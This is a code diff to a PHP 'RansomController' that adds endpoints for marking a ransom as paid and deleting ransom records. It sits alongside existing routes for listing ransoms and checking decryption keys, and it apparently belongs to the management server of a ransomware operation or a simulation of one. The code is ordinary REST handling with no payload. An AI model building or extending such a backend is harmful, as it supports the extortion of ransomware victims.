@@ -26,8 +26,10 @@ class RansomController extends Controller
         $this->add_endpoint("GET", "id/{string:id}", [$this, "fetch_ransom"]);
         $this->add_endpoint("GET", "{string:id}/{string:key}", [$this, "check_decryption_key"]);
         $this->add_endpoint("GET", "list", [$this, "get_all_ransoms"]);
-        $this->add_endpoint("POST", "", [$this, "create_premake_ransom"]);
         $this->add_endpoint("PUT", "{string:id}", [$this, "update_ransom"]);
+        $this->add_endpoint("POST", "", [$this, "create_premake_ransom"]);
+        $this->add_endpoint("PATCH", "{string:id}", [$this, "set_paid_ransom"]);
+        $this->add_endpoint("DELETE", "{string:id}", [$this, "delete_ransom"]);
     }
 
     public function update_ransom(array $query_params, HttpResponse $response): void
@@ -82,6 +84,34 @@ class RansomController extends Controller
             $response->status_code = 500;
             $response->body = $e->getMessage();
         }
+    }
+
+    public function delete_ransom(array $query_params, HttpResponse $response): void
+    {
+        $deleted = $this->service->delete_ransom($query_params["id"]);
+        if(!$deleted)
+        {
+            $response->status_code = 404;
+            $response->body = "Ransom not found";
+            return;
+        }
+
+        $response->status_code = 204;
+    }
+
+    public function set_paid_ransom(array $query_params, HttpResponse $response): void
+    {
+        $ransom = $this->service->fetch_ransom($query_params["id"]);
+        if($ransom === null)
+        {
+            $response->status_code = 404;
+            $response->body = "Ransom not found";
+            return;
+        }
+
+        $this->service->set_paid_ransom($ransom);
+        $response->headers["Content-Type"] = "application/json";
+        $response->status_code = 204;
     }
 
     public function fetch_ransom(array $query_params, HttpResponse $response): void
